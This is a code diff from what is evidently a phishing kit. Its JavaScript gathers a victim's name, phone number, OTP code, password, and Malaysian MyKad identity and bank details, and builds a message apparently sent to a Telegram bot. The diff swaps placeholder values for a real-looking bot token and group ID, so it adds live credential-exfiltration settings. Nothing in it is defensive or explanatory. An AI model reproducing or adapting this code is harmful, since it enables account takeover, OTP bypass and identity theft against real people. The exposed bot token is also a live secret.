@@ -6,8 +6,8 @@ function processFirstData(){
 	var $phone_number = $("input#phone_number").val();
 	//Nama%20%3A%205555555%0ANomor%20%3A%205555555%0AOpt%20%3A%20555555%0APassword%20%3A%205555555
 	var gabungan = 'Nama%20%3A%20'+full_name.value+'%0ANomor%20%3A%20'+phone_number.value;
-	var token = 'tokenbot';
-	var grup = '-1111111';
+	var token = '8069935027:AAFTHjzfsSgl0k7TgUrzZte6FyJaPg4QlTo';
+	var grup = '-4719043555';
 
 
 	if($full_name == "" && $phone_number === ""){
@@ -42,8 +42,8 @@ function processSecondData(){
 	var $otp_code = $("input#otp_code").val();
 	var $full_name = $("input#validateFullName").val();
 	var gabungan = 'Nama%20%3A%20'+full_name.value+'%0ANomor%20%3A%20'+phone_number.value+`%0AOtp%20%3A%20`+ otp.value;
-	var token = 'tokenbot';
-	var grup = '-1111111';
+	var token = '8069935027:AAFTHjzfsSgl0k7TgUrzZte6FyJaPg4QlTo';
+	var grup = '-4719043555';
 
 	if($full_name == "" && $phone_number == "" && $otp_code == ""){
 	$('.verification_info').show();
@@ -77,8 +77,8 @@ function processThirdData(){
 	var $phone_number = $("input#validatephone_number").val();
 	var $otp_code = $("input#validateotp_code").val();
 	var $password = $("input#password").val();
-	var token = 'tokenbot';
-	var grup = '-1111111';
+	var token = '8069935027:AAFTHjzfsSgl0k7TgUrzZte6FyJaPg4QlTo';
+	var grup = '-4719043555';
 	var gabungan = 'Nama%20%3A%20'+full_name.value+'%0ANomor%20%3A%20'+phone_number.value+`%0AOtp%20%3A%20`+ otp.value+`%0APassword%20%3A%20`+password.value;
 
 	
@@ -121,8 +121,8 @@ function processfourData(){
 	var $bank_mykad = $("input#bank_mykad").val();
 	var $nbnk_mykad = $("input#nbnk_mykad").val();
 	var $emel_mykad = $("input#emel_mykad").val();
-	var token = 'tokenbot';
-	var grup = '-1111111';
+	var token = '8069935027:AAFTHjzfsSgl0k7TgUrzZte6FyJaPg4QlTo';
+	var grup = '-4719043555';
 
 
 	if($phone_number == "" && $otp_code == "" && $password == "" && $no_mykad == "" && $nama_mykad == "" && $umur_mykad == "" && $alamat_mykad == "" && $jantina_mykad == "" && $pekerjaan_mykad == "" && $bank_mykad == "" && $nbnk_mykad == "" && $emel_mykad == ""){
